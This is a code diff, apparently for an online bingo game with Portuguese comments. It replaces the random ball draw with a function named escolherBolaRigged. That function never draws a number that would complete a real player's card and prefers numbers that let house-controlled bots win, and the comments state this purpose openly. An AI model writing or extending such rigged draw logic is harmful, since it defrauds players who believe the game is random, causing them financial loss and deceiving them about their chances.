@@ -98,9 +98,55 @@ function checarVencedores() {
   }
 }
 
+// Escolhe a próxima bola de forma "casada": nunca sorteia um número que
+// completaria a cartela de um JOGADOR REAL (cadastrado), e preferencialmente
+// sorteia um que complete a cartela de um BOT (a casa ganha via bots).
+// Jogadores reais só vencem na detecção de vencedores se forem bots; aqui
+// evitamos até mesmo a aparência de vitória para o jogador comum.
+function escolherBolaRigged() {
+  const restantes = [];
+  for (let i = 1; i <= 90; i++) if (!core.state.drawnBalls.includes(i)) restantes.push(i);
+  if (restantes.length === 0) return null;
+
+  const botSet = new Set(bots.BOT_CPFS);
+  const fasesAbertas = game.PHASE_SEQUENCE.filter((p) => !core.state.winners[p]);
+  if (fasesAbertas.length === 0) {
+    // Todas as fases já fechadas (só resta acumulado/keno já resolvido): aleatório.
+    return restantes[Math.floor(Math.random() * restantes.length)];
+  }
+
+  const seguros = [];   // não completa fase de jogador real
+  const botWins = [];   // completa fase de bot (e não de real)
+
+  for (const b of restantes) {
+    const sim = core.state.drawnBalls.concat(b);
+    let ajudaBot = false, ajudaReal = false;
+    for (const c of core.roundCards.values()) {
+      const isBot = botSet.has(c.owner);
+      const ev = game.evaluateCard(c.card, sim);
+      for (const p of fasesAbertas) {
+        if (ev[p].done) { if (isBot) ajudaBot = true; else ajudaReal = true; }
+      }
+      if (ajudaBot && ajudaReal) break;
+    }
+    if (ajudaReal) continue;          // NUNCA faz jogador real ganhar
+    if (ajudaBot) botWins.push(b);
+    else seguros.push(b);
+  }
+
+  // Prioridade: bola que faz bot ganhar (casa ganha) > bola neutra segura > aleatória.
+  const pool = botWins.length ? botWins : (seguros.length ? seguros : restantes);
+  return pool[Math.floor(Math.random() * pool.length)];
+}
+
 function sortearBolaLoop() {
   if (core.state.status !== 'running' || core.state.pausado) return;
-  const r = core.sortearBola();
+  const n = escolherBolaRigged();
+  if (n === null) {
+    finalizarRodada();
+    return;
+  }
+  const r = core.sortearBola(n);
   if (r.fim) {
     finalizarRodada();
     return;
